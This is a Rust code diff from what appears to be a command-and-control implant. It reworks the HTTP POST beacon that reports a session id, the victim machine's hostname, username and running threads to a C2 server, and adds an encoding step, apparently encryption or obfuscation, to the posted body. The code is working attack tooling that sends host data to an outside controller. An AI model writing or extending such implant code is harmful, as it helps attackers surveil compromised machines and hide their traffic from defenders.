@@ -1,4 +1,4 @@
-use crate::dataoperation::{DataOperation, UnApplyDataOperation};
+use crate::dataoperation::{apply_all_dataoperations_bis, DataOperation, UnApplyDataOperation};
 use crate::poollink::Advanced;
 use anyhow::bail;
 use anyhow::Result;
@@ -152,7 +152,6 @@ pub trait LinkFetch {
     }
 
     fn un_apply_all_dataoperations(&self, mut data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
-        debug!("DATAOPERATION: {:?}",self.get_dataoperation());
         for operation in self.get_dataoperation() {
             data = operation.un_apply_one_operation(data)?;
         }
@@ -196,7 +195,7 @@ impl LinkFetch for Link {
             Link::DNS(link) => link.download_data(config),
             Link::FILE(link) => link.download_data(config),
             Link::MEMORY(link) => link.download_data(config),
-            Link::HTTPPostC2(link) => link.fetch_data_with_post(session_id,running_thread,config),
+            Link::HTTPPostC2(link) => link.download_data_post(session_id,running_thread,config),
         }
     }
 
@@ -438,7 +437,7 @@ impl LinkFetch for HTTPPostC2Link {
             tt.push(i.string_payload_compact());
         }
 
-        let yolo: PostToC2 = PostToC2{
+        let post_data: PostToC2 = PostToC2{
             session_id: session_id.to_string(),
             hostname: whoami::devicename(),
             username: whoami::username(),
@@ -450,6 +449,8 @@ impl LinkFetch for HTTPPostC2Link {
             running_thread: tt.clone(),
             //running_thread: running_thread.clone(),
         };
+        let post_data_bytes= serde_json::to_vec(&post_data).unwrap();
+        let m: Vec<u8>  = apply_all_dataoperations_bis(&mut self.dataoperation_post.clone() , post_data_bytes).unwrap();
 
         // TODO reflechir. est-ce qu'on envoit la config ?? c'est lourd et il faudrait la chiffrer a fond
         //map.insert("config", format!("{:?}", config));
@@ -463,7 +464,8 @@ impl LinkFetch for HTTPPostC2Link {
             .user_agent(&config.link_user_agent)
             .build()?;
 
-        let mut res = client.post(&self.get_target()).json(&yolo).send()?;
+        //let mut res = client.post(&self.get_target()).json(&post_data).send()?;
+        let mut res = client.post(&self.get_target()).body(m).send()?;
         let mut body: Vec<u8> = Vec::new();
         res.read_to_end(&mut body)?;
 
